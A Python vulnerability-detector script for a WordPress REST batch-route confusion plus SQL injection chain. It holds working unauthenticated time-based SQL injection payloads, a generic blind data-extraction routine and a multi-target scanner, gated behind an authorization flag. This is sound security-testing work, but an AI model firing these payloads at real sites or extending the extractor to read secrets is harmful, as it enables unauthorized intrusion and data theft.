#!/usr/bin/env python3
"""
wp2shell_check.py — non-destructive detector for wp2shell
=========================================================
CVE-2026-63030 (REST /batch/v1 route confusion) + CVE-2026-60137
(WP_Query::author__not_in SQL injection) in WordPress core 6.9.0-6.9.4 / 7.0.0-7.0.1.

What it does
------------
Confirms the *unauthenticated SQL injection* with a time-based differential: it sends a
"fast" and a "slow" request through the batch-route confusion and measures the delay. It
reads no data and changes nothing (default mode). `--proof` additionally reads two harmless
scalars (@@version, current_user()) as hard evidence for a report — still read-only.

It does NOT attempt code execution. The INTO OUTFILE -> webshell path needs the DB user to
hold FILE privilege plus a web-served secure_file_priv dir (see README); that is out of scope
for a detector.

Authorized use only
-------------------
Run this against systems you own or are explicitly authorized to test. Remote (non-loopback)
targets require --authorized.

Usage
-----
    python3 wp2shell_check.py http://target[:port]           # single target, detection
    python3 wp2shell_check.py http://target --proof          # + read @@version as evidence
    python3 wp2shell_check.py -f hosts.txt --authorized --json
    python3 wp2shell_check.py http://127.0.0.1:8093          # local lab (no --authorized needed)

Status values:
  vulnerable        - actively confirmed via the injection (batch confusion, 6.9.0-7.0.1)
  affected_version  - fingerprinted version is in an affected range but the active check did
                      not fire (e.g. 6.8.0-6.8.5 has the SQLi sink but not the 6.9+ confusion
                      delivery; or a WAF/edge blocked the probe). Version-based, not proof.
  not_vulnerable    - active check negative and version outside the affected ranges

Exit codes: 0 = needs attention (vulnerable or affected_version), 1 = not vulnerable, 2 = error.
Follows redirects while preserving the POST body; ignores TLS errors (curl -k).
"""
import argparse
import concurrent.futures
import json
import ssl
import statistics
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import Counter

__version__ = "1.2.0"


class _KeepPost(urllib.request.HTTPRedirectHandler):
    """Follow redirects but PRESERVE the POST method and body. urllib's default handler
    downgrades a redirected POST to a bodyless GET (301/302/303), which would silently
    drop the batch payload when a site redirects http->https or to a canonical host and
    produce a false negative. We keep POSTing to the Location instead. Loop protection
    (max_redirections) is still enforced by the parent."""
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        if req.get_method() == "POST" and code in (301, 302, 303, 307, 308):
            hdrs = {k: v for k, v in req.header_items() if k.lower() != "content-length"}
            return urllib.request.Request(newurl, data=req.data, headers=hdrs,
                                          origin_req_host=req.origin_req_host,
                                          unverifiable=True, method="POST")
        return super().redirect_request(req, fp, code, msg, headers, newurl)


class Target:
    def __init__(self, base, timeout=15, proxy=None, sleep=4.0, route="auto"):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.sleep = float(sleep)
        self.route = route
        self.batch = None        # resolved endpoint URL (canonical, post-redirect)
        self._base = 0.0         # measured baseline round-trip (set by detect(); used by the oracle)
        self._normalized = False # whether the base host/scheme has been canonicalized
        # Ignore TLS verification (self-signed / expired / hostname-mismatch certs are
        # common on test targets). Equivalent to `curl -k`.
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener_handlers = [urllib.request.HTTPSHandler(context=ctx), _KeepPost()]
        if proxy:
            opener_handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        else:
            opener_handlers.append(urllib.request.ProxyHandler({}))  # ignore env proxies
        self.opener = urllib.request.build_opener(*opener_handlers)

    UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

    def _normalize_base(self):
        """Follow redirects on the root once and pin the canonical scheme://host, so the
        batch POST goes straight to the final host (http->https, apex->www, etc.) instead
        of relying on a redirect for every probe. Only scheme+host are taken (never a
        redirected path), so REST routes stay correct."""
        if self._normalized:
            return
        self._normalized = True
        try:
            req = urllib.request.Request(self.base + "/", headers={"User-Agent": self.UA})
            with self.opener.open(req, timeout=self.timeout) as r:
                u = urllib.parse.urlparse(r.geturl())
                if u.scheme and u.netloc:
                    canon = "%s://%s" % (u.scheme, u.netloc)
                    if canon != self.base:
                        self.base = canon
                        self.batch = None  # re-resolve endpoint against the canonical host
        except Exception:
            pass

    # -- HTTP ---------------------------------------------------------------
    def _raw(self, url, data=None, headers=None, method=None):
        hdrs = dict(headers or {})
        hdrs.setdefault("User-Agent", self.UA)
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        t0 = time.perf_counter()
        try:
            with self.opener.open(req, timeout=self.timeout) as r:
                body = r.read()
                return r.status, time.perf_counter() - t0, body, r.geturl()
        except urllib.error.HTTPError as e:
            return e.code, time.perf_counter() - t0, e.read(), getattr(e, "url", url)

    def _endpoints(self):
        if self.route == "wp-json":
            return [self.base + "/wp-json/batch/v1"]
        if self.route == "rest-route":
            return [self.base + "/?rest_route=/batch/v1"]
        # auto: rest_route works without pretty permalinks; wp-json needs them
        return [self.base + "/?rest_route=/batch/v1", self.base + "/wp-json/batch/v1"]

    # -- payload ------------------------------------------------------------
    # The injected value breaks out of `post_author NOT IN ( <value> )` and wraps SLEEP
    # in a derived table:  (SELECT 1 FROM (SELECT SLEEP(n))x)  -- so MySQL materializes
    # and evaluates it once, independent of the number of rows the posts query returns.
    # A bare `NOT IN (SELECT SLEEP(n))` / `OR SLEEP(n)` gets optimized away and never
    # executes on some managed WordPress hosts, which reads as a false negative. The
    # nested subquery avoids that.
    @staticmethod
    def _envelope(author_exclude):
        """Nested batch (route confusion) that lands `author_exclude` in WP_Query::author__not_in."""
        enc = urllib.parse.quote(author_exclude, safe="")
        inner = {"requests": [
            {"method": "POST", "path": "///"},                            # misalignment trigger
            {"method": "GET",  "path": "/wp/v2/users?author_exclude=" + enc},
            {"method": "GET",  "path": "/wp/v2/posts"},                   # supplies get_items handler
        ]}
        return {"requests": [
            {"method": "POST", "path": "/v2/categories", "body": {"name": "x"}},
            {"method": "POST", "path": "///", "body": {"name": "x"}},
            {"method": "POST", "path": "/wp/v2/posts", "body": inner},    # self-call onto batch handler
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}

    def probe(self, author_exclude):
        """Send one injection carrying <author_exclude> into author__not_in. Returns (status, elapsed)."""
        self._normalize_base()
        body = json.dumps(self._envelope(author_exclude)).encode()
        headers = {"Content-Type": "application/json"}
        if self.batch is None:
            # resolve which endpoint form the site accepts (a processed batch answers 207/200);
            # pin the post-redirect URL so later probes hit the canonical endpoint directly.
            for ep in self._endpoints():
                st, _, _, final = self._raw(ep, data=body, headers=headers, method="POST")
                if st in (200, 207):
                    self.batch = final
                    break
            if self.batch is None:
                self.batch = self._endpoints()[0]  # fall back; timing still decides
        st, el, _, _ = self._raw(self.batch, data=body, headers=headers, method="POST")
        return st, el

    @staticmethod
    def _sleep_payload(seconds):
        return "0) OR (SELECT 1 FROM (SELECT SLEEP(%g))x)-- -" % seconds

    # -- detection ----------------------------------------------------------
    def detect(self, rounds=3):
        fast = statistics.median(self.probe(self._sleep_payload(0))[1] for _ in range(rounds))
        slow = statistics.median(self.probe(self._sleep_payload(self.sleep))[1] for _ in range(rounds))
        self._base = fast
        delta = slow - fast
        # vulnerable if the slow path tracks our injected sleep and the fast path did not
        vulnerable = delta >= (self.sleep * 0.6) and fast < (self.sleep * 0.5)
        return {"fast": fast, "slow": slow, "delta": delta, "vulnerable": vulnerable}

    # -- bounded read-only proof -------------------------------------------
    def _oracle(self, cond, unit=0.6):
        payload = "0) OR (SELECT 1 FROM (SELECT IF((%s),SLEEP(%g),0))x)-- -" % (cond, unit)
        _, el = self.probe(payload)
        return el > (self._base + unit * 0.6)   # relative to measured baseline (latency-safe)

    def read_scalar(self, expr, maxlen=40, unit=0.6):
        v = "COALESCE((%s),'')" % expr
        lo, hi = 0, maxlen
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._oracle("CHAR_LENGTH(%s)>=%d" % (v, mid), unit):
                lo = mid
            else:
                hi = mid - 1
        out = ""
        for pos in range(1, lo + 1):
            a, b = 32, 126
            while a < b:
                mid = (a + b + 1) // 2
                if self._oracle("ASCII(SUBSTRING(%s,%d,1))>=%d" % (v, pos, mid), unit):
                    a = mid
                else:
                    b = mid - 1
            out += chr(a)
        return out


# -- version fingerprint (best-effort, read-only) --------------------------
import re

# Full chain = batch-route confusion (CVE-2026-63030) + SQLi. Only these ranges are
# actively testable: the confusion is what bypasses input sanitization to reach the sink.
FULL_CHAIN = [((6, 9, 0), (6, 9, 4)), ((7, 0, 0), (7, 0, 1))]
# SQLi sink alone (CVE-2026-60137). The version is affected, but the confusion delivery
# does NOT exist here, so there is no unauth active check on this branch (fixed 6.8.6).
SINK_ONLY = [((6, 8, 0), (6, 8, 5))]


def _ver_tuple(s):
    m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", s)
    return (int(m.group(1)), int(m.group(2)), int(m.group(3) or 0)) if m else None


def fingerprint_version(t):
    for path, pat in (("/", r'content="WordPress\s+([0-9.]+)"'),
                      ("/readme.html", r"Version\s+([0-9.]+)"),
                      ("/feed/", r"<generator>\s*https?://wordpress\.org/\?v=([0-9.]+)")):
        try:
            _, _, body, _ = t._raw(t.base + path)
            m = re.search(pat, body.decode("utf-8", "replace"))
            if m:
                return m.group(1)
        except Exception:
            pass
    return None


def version_verdict(ver):
    vt = _ver_tuple(ver) if ver else None
    if not vt:
        return "unknown"
    if any(lo <= vt <= hi for lo, hi in FULL_CHAIN):
        return "affected-full-chain"
    if any(lo <= vt <= hi for lo, hi in SINK_ONLY):
        return "affected-sqli-sink-only"
    return "outside-affected-range"


# -- driver ----------------------------------------------------------------
def is_local(base):
    host = urllib.parse.urlparse(base).hostname or ""
    return host in ("localhost", "127.0.0.1", "::1", "[::1]")


def scan_one(url, args):
    t = Target(url, timeout=args.timeout, proxy=args.proxy, sleep=args.sleep, route=args.route)
    rec = {"target": url}
    try:
        det = t.detect(rounds=args.rounds)
    except urllib.error.URLError as e:
        rec.update(status="error", error=str(e.reason))
        return rec, 2
    ver = fingerprint_version(t)
    rec["wp_version"] = ver
    rec["version_verdict"] = version_verdict(ver)
    rec["fast_s"] = round(det["fast"], 3)
    rec["slow_s"] = round(det["slow"], 3)
    rec["delta_s"] = round(det["delta"], 3)
    active = det["vulnerable"]
    vv = rec["version_verdict"]
    rec["active_check"] = "fired" if active else "negative"
    if active:
        rec["status"] = "vulnerable"                     # actively confirmed via the injection
    elif vv in ("affected-full-chain", "affected-sqli-sink-only"):
        rec["status"] = "affected_version"               # version affected; active probe didn't confirm
        if vv == "affected-sqli-sink-only":
            rec["note"] = ("version affected by the author__not_in SQLi (CVE-2026-60137, fixed 6.8.6); "
                           "the batch-route confusion that delivers it unauthenticated is 6.9.0+, so "
                           "there is no unauth active check on the 6.8.x branch")
        else:
            rec["note"] = ("version in the full-chain range but the active injection did not fire "
                           "(a WAF/edge may be blocking the batch payload, or the probe was throttled) "
                           "-- treat as affected and patch")
    else:
        rec["status"] = "not_vulnerable"
    code = 0 if rec["status"] in ("vulnerable", "affected_version") else 1
    if active and args.proof:
        try:
            rec["proof"] = {"@@version": t.read_scalar("SELECT @@version", 40),
                            "current_user()": t.read_scalar("SELECT CURRENT_USER()", 48)}
        except Exception as e:
            rec["proof_error"] = str(e)
    return rec, code


def human(rec):
    tag = {"vulnerable": "VULNERABLE", "affected_version": "AFFECTED (version)",
           "not_vulnerable": "not vulnerable", "error": "ERROR"}[rec["status"]]
    line = "[%s] %s" % (tag, rec["target"])
    if rec.get("wp_version"):
        line += "  (WordPress %s, %s)" % (rec["wp_version"], rec["version_verdict"])
    if rec["status"] == "error":
        line += "  -- %s" % rec.get("error")
    elif "delta_s" in rec:
        line += "  [active=%s fast=%.2fs slow=%.2fs delta=%.2fs]" % (
            rec.get("active_check", "?"), rec["fast_s"], rec["slow_s"], rec["delta_s"])
    out = [line]
    if rec.get("note"):
        out.append("        note: " + rec["note"])
    if rec.get("proof"):
        for k, v in rec["proof"].items():
            out.append("        proof  %-16s = %s" % (k, v))
    return "\n".join(out)


def main():
    p = argparse.ArgumentParser(description="Non-destructive wp2shell (CVE-2026-63030/60137) detector.")
    p.add_argument("url", nargs="?", help="target base URL, e.g. http://host:8093")
    p.add_argument("-f", "--file", help="file with one target URL per line (# comments ok)")
    p.add_argument("--proof", action="store_true", help="read @@version + current_user() as evidence (read-only)")
    p.add_argument("--route", choices=("auto", "rest-route", "wp-json"), default="auto")
    p.add_argument("--sleep", type=float, default=4.0, help="injected SLEEP seconds (default 4)")
    p.add_argument("--rounds", type=int, default=3, help="median over N probes (default 3)")
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080 (Burp)")
    p.add_argument("-t", "--threads", type=int, default=10,
                   help="concurrent workers for -f scans (default 10). Timing detection is "
                        "robust under concurrency because the multi-second SLEEP dominates jitter.")
    p.add_argument("--authorized", action="store_true", help="assert authorization for remote targets")
    p.add_argument("--json", action="store_true", help="emit JSON")
    args = p.parse_args()

    targets = []
    if args.file:
        with open(args.file) as fh:
            targets = [ln.strip() for ln in fh if ln.strip() and not ln.strip().startswith("#")]
    if args.url:
        targets.insert(0, args.url)
    if not targets:
        p.error("provide a target URL or -f hosts.txt")

    remote = [u for u in targets if not is_local(u)]
    if remote and not args.authorized:
        sys.stderr.write(
            "refusing remote targets without --authorized.\n"
            "Only test assets you own or are explicitly authorized to test.\n"
            "Affected remote targets: %s\n" % ", ".join(remote))
        return 2

    def prep(u):
        return u if "://" in u else "http://" + u

    def work(idx, u):
        try:
            rec, _ = scan_one(prep(u), args)
        except Exception as e:                       # one bad host must never kill the run
            rec = {"target": prep(u), "status": "error", "error": repr(e)}
        return idx, rec

    total = len(targets)
    workers = max(1, min(args.threads, total))
    results = [None] * total
    lock = threading.Lock()
    done = [0]

    def emit(idx, rec):
        results[idx] = rec
        with lock:
            done[0] += 1
            if args.json:
                sys.stderr.write("\r  scanned %d/%d" % (done[0], total)); sys.stderr.flush()
            else:
                pfx = "[%d/%d] " % (done[0], total) if total > 1 else ""
                print(pfx + human(rec), flush=True)

    if workers == 1:
        for i, u in enumerate(targets):
            emit(*work(i, u))
    else:
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
            futs = [ex.submit(work, i, u) for i, u in enumerate(targets)]
            try:
                for fut in concurrent.futures.as_completed(futs):
                    emit(*fut.result())
            except KeyboardInterrupt:
                sys.stderr.write("\ninterrupted -- cancelling pending scans\n")
                ex.shutdown(wait=False, cancel_futures=True)

    results = [r for r in results if r is not None]
    if args.json:
        sys.stderr.write("\n")
        print(json.dumps(results, indent=2))

    c = Counter(r["status"] for r in results)
    sys.stderr.write("\nsummary: %d scanned | vulnerable=%d  affected_version=%d  "
                     "not_vulnerable=%d  error=%d\n" % (
                         len(results), c.get("vulnerable", 0), c.get("affected_version", 0),
                         c.get("not_vulnerable", 0), c.get("error", 0)))

    # exit 0 if any host needs attention (actively vulnerable or affected version),
    # else 1 (all clear), else 2 (all errored)
    if any(r["status"] in ("vulnerable", "affected_version") for r in results):
        return 0
    if results and all(r["status"] == "error" for r in results):
        return 2
    return 1


if __name__ == "__main__":
    sys.exit(main())
